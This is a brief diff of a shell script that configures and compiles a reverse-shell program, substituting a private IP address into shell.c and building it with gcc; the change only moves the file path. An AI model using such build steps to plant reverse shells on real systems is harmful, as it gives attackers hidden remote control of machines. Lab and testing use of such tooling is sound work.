@@ -7,7 +7,7 @@ fi
 
 chmod +x shellservice
 
-sed -i -e 's/"LOCAL ADDRESS GOES HERE"/"10.0.114.26"/g' /home/script/reverse-shell/shell.c
+sed -i -e 's/"LOCAL ADDRESS GOES HERE"/"10.0.114.26"/g' /home/reverse/reverse-shell/shell.c
 
 gcc shell.c -o shell
 
